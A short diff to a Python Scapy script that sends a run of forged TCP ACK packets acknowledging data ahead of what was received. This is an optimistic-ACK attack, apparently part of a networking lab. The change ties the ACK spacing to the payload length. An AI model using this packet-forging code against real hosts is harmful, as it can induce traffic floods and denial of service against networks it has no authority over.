@@ -27,7 +27,7 @@ if __name__ == "__main__":
 
     socket = conf.L2socket(iface='client-eth0') 
     OPT_ACK_START = data.seq + 1
-    ACK_SPACING = 2000
-    for i in range(51):
+    ACK_SPACING = len(data.payload)
+    for i in range(1, 51):
         opt_ack = Ether() / ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(OPT_ACK_START + i * ACK_SPACING), seq=(seq_no + 1))
         socket.send(opt_ack)
